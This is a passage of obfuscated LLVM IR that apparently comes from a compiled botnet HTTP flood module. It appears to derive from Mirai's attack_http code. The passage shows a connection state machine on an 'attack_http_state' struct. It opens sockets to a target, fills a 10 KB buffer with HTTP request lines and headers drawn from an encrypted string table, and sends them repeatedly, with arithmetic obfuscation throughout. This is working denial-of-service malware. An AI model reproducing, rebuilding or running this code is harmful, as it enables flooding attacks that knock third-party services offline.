  %461 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %460, i16* %461, align 2
  %462 = load i32, i32* %27, align 4
  %463 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %463, i32 0, i32 2
  store i32 %462, i32* %464, align 4
  %465 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %466 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %465, i32 0, i32 1
  store i8 2, i8* %466, align 4
  %467 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %468 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 4
  %470 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %471 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %471, %struct.sockaddr** %470, align 8
  %472 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %473 = load %struct.sockaddr*, %struct.sockaddr** %472, align 8
  %474 = call i32 @connect(i32 %469, %struct.sockaddr* %473, i32 16)
  %475 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = srem i32 %477, 64
  %479 = zext i32 %478 to i64
  %480 = shl i64 1, %479
  %481 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %482 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %482, i32 0, i32 0
  %484 = load i32, i32* %483, align 4
  %485 = sdiv i32 %484, 64
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds [16 x i64], [16 x i64]* %481, i64 0, i64 %486
  %488 = load i64, i64* %487, align 8
  %489 = and i64 %488, %480
  %490 = xor i64 %488, %480
  %491 = or i64 %489, %490
  %492 = or i64 %488, %480
  store i64 %491, i64* %487, align 8
  %493 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %493, i32 0, i32 0
  %495 = load i32, i32* %494, align 4
  %496 = load i32, i32* %23, align 4
  %497 = icmp sgt i32 %495, %496
  br i1 %497, label %498, label %505

; <label>:498:                                    ; preds = %435
  %499 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %499, i32 0, i32 0
  %501 = load i32, i32* %500, align 4
  %502 = sub i32 0, 1
  %503 = sub i32 %501, %502
  %504 = add nsw i32 %501, 1
  store i32 %503, i32* %23, align 4
  br label %505

; <label>:505:                                    ; preds = %498, %435
  br label %1024

; <label>:506:                                    ; preds = %412
  %507 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %508 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %507, i32 0, i32 1
  %509 = load i8, i8* %508, align 4
  %510 = zext i8 %509 to i32
  %511 = icmp eq i32 %510, 2
  br i1 %511, label %512, label %565

; <label>:512:                                    ; preds = %506
  %513 = load i32, i32* %27, align 4
  %514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %514, i32 0, i32 2
  %516 = load i32, i32* %515, align 4
  %517 = sub i32 %513, -831606167
  %518 = sub i32 %517, %516
  %519 = add i32 %518, -831606167
  %520 = sub i32 %513, %516
  %521 = icmp ugt i32 %519, 30
  br i1 %521, label %522, label %531

; <label>:522:                                    ; preds = %512
  %523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %523, i32 0, i32 1
  store i8 0, i8* %524, align 4
  %525 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %526 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 4
  %528 = call i32 @close(i32 %527)
  %529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %529, i32 0, i32 0
  store i32 -1, i32* %530, align 4
  br label %1025

; <label>:531:                                    ; preds = %512
  %532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %532, i32 0, i32 0
  %534 = load i32, i32* %533, align 4
  %535 = srem i32 %534, 64
  %536 = zext i32 %535 to i64
  %537 = shl i64 1, %536
  %538 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %539 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %540 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %539, i32 0, i32 0
  %541 = load i32, i32* %540, align 4
  %542 = sdiv i32 %541, 64
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds [16 x i64], [16 x i64]* %538, i64 0, i64 %543
  %545 = load i64, i64* %544, align 8
  %546 = and i64 %545, %537
  %547 = xor i64 %545, %537
  %548 = or i64 %546, %547
  %549 = or i64 %545, %537
  store i64 %548, i64* %544, align 8
  %550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 4
  %553 = load i32, i32* %23, align 4
  %554 = icmp sgt i32 %552, %553
  br i1 %554, label %555, label %564

; <label>:555:                                    ; preds = %531
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 0
  %558 = load i32, i32* %557, align 4
  %559 = sub i32 0, %558
  %560 = sub i32 0, 1
  %561 = add i32 %559, %560
  %562 = sub i32 0, %561
  %563 = add nsw i32 %558, 1
  store i32 %562, i32* %23, align 4
  br label %564

; <label>:564:                                    ; preds = %555, %531
  br label %1023

; <label>:565:                                    ; preds = %506
  %566 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %566, i32 0, i32 1
  %568 = load i8, i8* %567, align 4
  %569 = zext i8 %568 to i32
  %570 = icmp eq i32 %569, 4
  br i1 %570, label %571, label %866

; <label>:571:                                    ; preds = %565
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i32 0, i32 14
  store i32 -1, i32* %573, align 4
  %574 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %574, i32 0, i32 11
  store i32 0, i32* %575, align 4
  %576 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %577 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %576, i32 0, i32 18
  %578 = getelementptr inbounds [1024 x i8], [1024 x i8]* %577, i32 0, i32 0
  call void @util_zero(i8* %578, i32 1024)
  %579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %579, i32 0, i32 17
  store i32 0, i32* %580, align 4
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %581, i32 10240)
  %582 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %583 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %584 = call i32 @util_strlen(i8* %583)
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds i8, i8* %582, i64 %585
  %587 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %587, i32 0, i32 9
  %589 = getelementptr inbounds [9 x i8], [9 x i8]* %588, i32 0, i32 0
  %590 = call i32 @util_strcpy(i8* %586, i8* %589)
  %591 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %592 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %593 = call i32 @util_strlen(i8* %592)
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds i8, i8* %591, i64 %594
  %596 = call i32 @util_strcpy(i8* %595, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %597 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %598 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %599 = call i32 @util_strlen(i8* %598)
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds i8, i8* %597, i64 %600
  %602 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %603 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %602, i32 0, i32 6
  %604 = getelementptr inbounds [257 x i8], [257 x i8]* %603, i32 0, i32 0
  %605 = call i32 @util_strcpy(i8* %601, i8* %604)
  %606 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %607 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %608 = call i32 @util_strlen(i8* %607)
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds i8, i8* %606, i64 %609
  %611 = call i32 @util_strcpy(i8* %610, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %612 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %613 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %614 = call i32 @util_strlen(i8* %613)
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds i8, i8* %612, i64 %615
  %617 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %618 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %617, i32 0, i32 5
  %619 = getelementptr inbounds [512 x i8], [512 x i8]* %618, i32 0, i32 0
  %620 = call i32 @util_strcpy(i8* %616, i8* %619)
  %621 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %622 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %623 = call i32 @util_strlen(i8* %622)
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds i8, i8* %621, i64 %624
  %626 = call i32 @util_strcpy(i8* %625, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %627 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %628 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %629 = call i32 @util_strlen(i8* %628)
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds i8, i8* %627, i64 %630
  %632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %632, i32 0, i32 7
  %634 = getelementptr inbounds [129 x i8], [129 x i8]* %633, i32 0, i32 0
  %635 = call i32 @util_strcpy(i8* %631, i8* %634)
  %636 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %637 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %638 = call i32 @util_strlen(i8* %637)
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds i8, i8* %636, i64 %639
  %641 = call i32 @util_strcpy(i8* %640, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %642 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %643 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %644 = call i32 @util_strlen(i8* %643)
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds i8, i8* %642, i64 %645
  %647 = call i8* @table_retrieve_val(i32 39, i32* null)
  %648 = call i32 @util_strcpy(i8* %646, i8* %647)
  call void @table_lock_val(i8 zeroext 39)
  %649 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %650 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %651 = call i32 @util_strlen(i8* %650)
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds i8, i8* %649, i64 %652
  %654 = call i32 @util_strcpy(i8* %653, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %655 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %656 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %657 = call i32 @util_strlen(i8* %656)
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds i8, i8* %655, i64 %658
  %660 = call i8* @table_retrieve_val(i32 40, i32* null)
  %661 = call i32 @util_strcpy(i8* %659, i8* %660)
  call void @table_lock_val(i8 zeroext 40)
  %662 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %663 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %664 = call i32 @util_strlen(i8* %663)
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds i8, i8* %662, i64 %665
  %667 = call i32 @util_strcpy(i8* %666, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %668 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %669 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %670 = call i32 @util_strlen(i8* %669)
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds i8, i8* %668, i64 %671
  %673 = call i8* @table_retrieve_val(i32 41, i32* null)
  %674 = call i32 @util_strcpy(i8* %672, i8* %673)
  call void @table_lock_val(i8 zeroext 41)
  %675 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %676 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %677 = call i32 @util_strlen(i8* %676)
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds i8, i8* %675, i64 %678
  %680 = call i32 @util_strcpy(i8* %679, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %681 = load i8*, i8** %14, align 8
  %682 = icmp ne i8* %681, null
  br i1 %682, label %683, label %724

; <label>:683:                                    ; preds = %571
  call void @table_unlock_val(i8 zeroext 42)
  %684 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %685 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %686 = call i32 @util_strlen(i8* %685)
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds i8, i8* %684, i64 %687
  %689 = call i8* @table_retrieve_val(i32 42, i32* null)
  %690 = call i32 @util_strcpy(i8* %688, i8* %689)
  call void @table_lock_val(i8 zeroext 42)
  %691 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %692 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %693 = call i32 @util_strlen(i8* %692)
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds i8, i8* %691, i64 %694
  %696 = call i32 @util_strcpy(i8* %695, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %697 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %698 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %699 = call i32 @util_strlen(i8* %698)
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds i8, i8* %697, i64 %700
  %702 = call i8* @table_retrieve_val(i32 47, i32* null)
  %703 = call i32 @util_strcpy(i8* %701, i8* %702)
  %704 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %705 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %706 = call i32 @util_strlen(i8* %705)
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds i8, i8* %704, i64 %707
  %709 = call i32 @util_strcpy(i8* %708, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %710 = load i8*, i8** %14, align 8
  %711 = call i32 @util_strlen(i8* %710)
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %714 = call i32 @util_strlen(i8* %713)
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds i8, i8* %712, i64 %715
  %717 = call i8* @util_itoa(i32 %711, i32 10, i8* %716)
  %718 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %719 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %720 = call i32 @util_strlen(i8* %719)
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds i8, i8* %718, i64 %721
  %723 = call i32 @util_strcpy(i8* %722, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %724

; <label>:724:                                    ; preds = %683, %571
  %725 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %726 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %725, i32 0, i32 15
  %727 = load i32, i32* %726, align 4
  %728 = icmp sgt i32 %727, 0
  br i1 %728, label %729, label %774

; <label>:729:                                    ; preds = %724
  %730 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %731 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %732 = call i32 @util_strlen(i8* %731)
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %730, i64 %733
  %735 = call i32 @util_strcpy(i8* %734, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %736

; <label>:736:                                    ; preds = %761, %729
  %737 = load i32, i32* %10, align 4
  %738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %738, i32 0, i32 15
  %740 = load i32, i32* %739, align 4
  %741 = icmp slt i32 %737, %740
  br i1 %741, label %742, label %767

; <label>:742:                                    ; preds = %736
  %743 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %744 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %745 = call i32 @util_strlen(i8* %744)
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds i8, i8* %743, i64 %746
  %748 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %749 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %748, i32 0, i32 16
  %750 = load i32, i32* %10, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %749, i64 0, i64 %751
  %753 = getelementptr inbounds [128 x i8], [128 x i8]* %752, i32 0, i32 0
  %754 = call i32 @util_strcpy(i8* %747, i8* %753)
  %755 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = call i32 @util_strlen(i8* %756)
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds i8, i8* %755, i64 %758
  %760 = call i32 @util_strcpy(i8* %759, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %761

; <label>:761:                                    ; preds = %742
  %762 = load i32, i32* %10, align 4
  %763 = sub i32 %762, 477189199
  %764 = add i32 %763, 1
  %765 = add i32 %764, 477189199
  %766 = add nsw i32 %762, 1
  store i32 %765, i32* %10, align 4
  br label %736

; <label>:767:                                    ; preds = %736
  %768 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %769 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %770 = call i32 @util_strlen(i8* %769)
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds i8, i8* %768, i64 %771
  %773 = call i32 @util_strcpy(i8* %772, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %774

; <label>:774:                                    ; preds = %767, %724
  %775 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %776 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %777 = call i32 @util_strlen(i8* %776)
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds i8, i8* %775, i64 %778
  %780 = call i32 @util_strcpy(i8* %779, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %781 = load i8*, i8** %14, align 8
  %782 = icmp ne i8* %781, null
  br i1 %782, label %783, label %791

; <label>:783:                                    ; preds = %774
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %786 = call i32 @util_strlen(i8* %785)
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %784, i64 %787
  %789 = load i8*, i8** %14, align 8
  %790 = call i32 @util_strcpy(i8* %788, i8* %789)
  br label %791

; <label>:791:                                    ; preds = %783, %774
  %792 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %793 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %792, i32 0, i32 9
  %794 = getelementptr inbounds [9 x i8], [9 x i8]* %793, i32 0, i32 0
  %795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %795, i32 0, i32 10
  %797 = getelementptr inbounds [9 x i8], [9 x i8]* %796, i32 0, i32 0
  %798 = call signext i8 @util_strcmp(i8* %794, i8* %797)
  %799 = icmp ne i8 %798, 0
  br i1 %799, label %808, label %800

; <label>:800:                                    ; preds = %791
  %801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %801, i32 0, i32 9
  %803 = getelementptr inbounds [9 x i8], [9 x i8]* %802, i32 0, i32 0
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 10
  %806 = getelementptr inbounds [9 x i8], [9 x i8]* %805, i32 0, i32 0
  %807 = call i32 @util_strcpy(i8* %803, i8* %806)
  br label %808

; <label>:808:                                    ; preds = %800, %791
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %814 = call i32 @util_strlen(i8* %813)
  %815 = sext i32 %814 to i64
  %816 = call i64 @send(i32 %811, i8* %812, i64 %815, i32 16384)
  %817 = load i32, i32* %27, align 4
  %818 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %818, i32 0, i32 3
  store i32 %817, i32* %819, align 4
  %820 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %821 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %820, i32 0, i32 1
  store i8 6, i8* %821, align 4
  %822 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %823 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %822, i32 0, i32 0
  %824 = load i32, i32* %823, align 4
  %825 = srem i32 %824, 64
  %826 = zext i32 %825 to i64
  %827 = shl i64 1, %826
  %828 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 4
  %832 = sdiv i32 %831, 64
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds [16 x i64], [16 x i64]* %828, i64 0, i64 %833
  %835 = load i64, i64* %834, align 8
  %836 = xor i64 %835, -1
  %837 = xor i64 %827, -1
  %838 = xor i64 -8227814850527520977, -1
  %839 = and i64 %836, -8227814850527520977
  %840 = and i64 %835, %838
  %841 = and i64 %837, -8227814850527520977
  %842 = and i64 %827, %838
  %843 = or i64 %839, %840
  %844 = or i64 %841, %842
  %845 = xor i64 %843, %844
  %846 = or i64 %836, %837
  %847 = xor i64 %846, -1
  %848 = or i64 -8227814850527520977, %838
  %849 = and i64 %847, %848
  %850 = or i64 %845, %849
  %851 = or i64 %835, %827
  store i64 %850, i64* %834, align 8
  %852 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %853 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %852, i32 0, i32 0
  %854 = load i32, i32* %853, align 4
  %855 = load i32, i32* %23, align 4
  %856 = icmp sgt i32 %854, %855
  br i1 %856, label %857, label %865

; <label>:857:                                    ; preds = %808
  %858 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %859 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %858, i32 0, i32 0
  %860 = load i32, i32* %859, align 4
  %861 = sub i32 %860, -321787052
  %862 = add i32 %861, 1
  %863 = add i32 %862, -321787052
  %864 = add nsw i32 %860, 1
  store i32 %863, i32* %23, align 4
  br label %865

; <label>:865:                                    ; preds = %857, %808
  br label %1022

; <label>:866:                                    ; preds = %565
  %867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %867, i32 0, i32 1
  %869 = load i8, i8* %868, align 4
  %870 = zext i8 %869 to i32
  %871 = icmp eq i32 %870, 6
  br i1 %871, label %872, label %917

; <label>:872:                                    ; preds = %866
  %873 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %874 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %873, i32 0, i32 0
  %875 = load i32, i32* %874, align 4
  %876 = srem i32 %875, 64
  %877 = zext i32 %876 to i64
  %878 = shl i64 1, %877
  %879 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %880 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %881 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %880, i32 0, i32 0
  %882 = load i32, i32* %881, align 4
  %883 = sdiv i32 %882, 64
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds [16 x i64], [16 x i64]* %879, i64 0, i64 %884
  %886 = load i64, i64* %885, align 8
  %887 = xor i64 %886, -1
  %888 = xor i64 %878, -1
  %889 = xor i64 6213042265124344287, -1
  %890 = and i64 %887, 6213042265124344287
  %891 = and i64 %886, %889
  %892 = and i64 %888, 6213042265124344287
  %893 = and i64 %878, %889
  %894 = or i64 %890, %891
  %895 = or i64 %892, %893
  %896 = xor i64 %894, %895
  %897 = or i64 %887, %888
  %898 = xor i64 %897, -1
  %899 = or i64 6213042265124344287, %889
  %900 = and i64 %898, %899
  %901 = or i64 %896, %900
  %902 = or i64 %886, %878
  store i64 %901, i64* %885, align 8
  %903 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %904 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %903, i32 0, i32 0
  %905 = load i32, i32* %904, align 4
  %906 = load i32, i32* %23, align 4
  %907 = icmp sgt i32 %905, %906
  br i1 %907, label %908, label %916

; <label>:908:                                    ; preds = %872
  %909 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %910 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %909, i32 0, i32 0
  %911 = load i32, i32* %910, align 4
  %912 = add i32 %911, 555664990
  %913 = add i32 %912, 1
  %914 = sub i32 %913, 555664990
  %915 = add nsw i32 %911, 1
  store i32 %914, i32* %23, align 4
  br label %916

; <label>:916:                                    ; preds = %908, %872
  br label %1021

; <label>:917:                                    ; preds = %866
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 1
  %920 = load i8, i8* %919, align 4
  %921 = zext i8 %920 to i32
  %922 = icmp eq i32 %921, 7
  br i1 %922, label %923, label %956

; <label>:923:                                    ; preds = %917
  %924 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %925 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %924, i32 0, i32 0
  %926 = load i32, i32* %925, align 4
  %927 = srem i32 %926, 64
